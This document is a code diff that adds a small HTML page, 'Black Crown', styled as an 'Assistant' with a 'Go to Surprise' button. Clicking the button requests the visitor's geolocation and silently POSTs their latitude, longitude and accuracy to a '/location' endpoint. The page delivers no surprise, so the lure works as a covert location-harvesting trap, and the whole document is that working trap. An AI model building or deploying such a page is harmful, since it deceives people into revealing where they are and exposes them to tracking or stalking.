@@ -1,0 +1,85 @@
+
+<!DOCTYPE html>
+<html lang="en">
+<head>
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1">
+<title>Black Crown</title>
+<style>
+body {
+    background: #080808;
+    color: white;
+    font-family: Arial;
+    text-align: center;
+    padding: 75px 15px;
+}
+.crown { font-size: 75px; }
+h1 { color: #d4af37; letter-spacing: 3px; }
+button {
+    background: #d4af37;
+    color: black;
+    border: none;
+    padding: 15px 30px;
+    border-radius: 8px;
+    font-weight: bold;
+    font-size: 16px;
+    cursor: pointer;
+}
+#result {
+    margin-top: 30px;
+    color: #d4af37;
+    font-size: 20px;
+}
+</style>
+</head>
+<body>
+
+<div class="crown">👑</div>
+<h1>BLACK CROWN</h1>
+
+<p>Welcome to Black Crown Assistant.</p>
+
+<button onclick="shareLocation()">Go to Surprise</button>
+
+<div id="result"></div>
+
+<script>
+function shareLocation() {
+    const result = document.getElementById("result");
+
+    if (!navigator.geolocation) {
+        result.innerText = "Location unavailable.";
+        return;
+    }
+
+    result.innerText = "Wait few seconds...";
+
+    navigator.geolocation.getCurrentPosition(
+        async (position) => {
+            result.innerText = "Loading....";
+
+            const data = {
+                latitude: position.coords.latitude,
+                longitude: position.coords.longitude,
+                accuracy: position.coords.accuracy
+            };
+
+            try {
+                await fetch("/location", {
+                    method: "POST",
+                    headers: {"Content-Type": "application/json"},
+                    body: JSON.stringify(data)
+                });
+            } catch (error) {
+                result.innerText = "Unable to connect.";
+            }
+        },
+        () => {
+            result.innerText = "Location permission denied.";
+        }
+    );
+}
+</script>
+
+</body>
+</html>
